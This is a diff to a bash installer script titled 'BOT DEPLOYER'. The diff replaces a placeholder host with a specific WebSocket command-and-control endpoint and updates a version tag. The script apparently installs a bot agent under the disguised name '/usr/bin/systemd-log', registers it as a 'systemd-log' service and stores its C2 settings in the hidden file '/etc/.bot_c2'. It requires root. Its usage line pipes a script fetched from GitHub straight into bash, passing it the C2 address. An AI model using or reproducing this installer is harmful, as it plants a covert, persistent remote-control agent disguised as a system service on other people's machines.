@@ -3,8 +3,8 @@
 # BOT DEPLOYER — public repo, no token required
 # ============================================================
 # Usage:
-#   curl -sL https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://host/ws/bot/
-#   BOT_TAG=v4.0.6 bash install.sh wss://host/ws/bot/
+#   curl -sL https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://bot.minhvuong.io.vn/ws/bot/
+#   BOT_TAG=v4.0.6 bash install.sh wss://bot.minhvuong.io.vn/ws/bot/
 # ============================================================
 set -e
 
@@ -20,7 +20,7 @@ BOT_PATH="/usr/bin/systemd-log"
 C2_CFG="/etc/.bot_c2"
 SERVICE_NAME="systemd-log"
 # Optional pin: BOT_TAG=v4.0.6
-FALLBACK_TAG="${BOT_TAG:-v4.0.9}"
+FALLBACK_TAG="${BOT_TAG:-v4.0.11}"
 
 if [ "$(id -u)" -ne 0 ]; then
     err "Must run as root (sudo)."
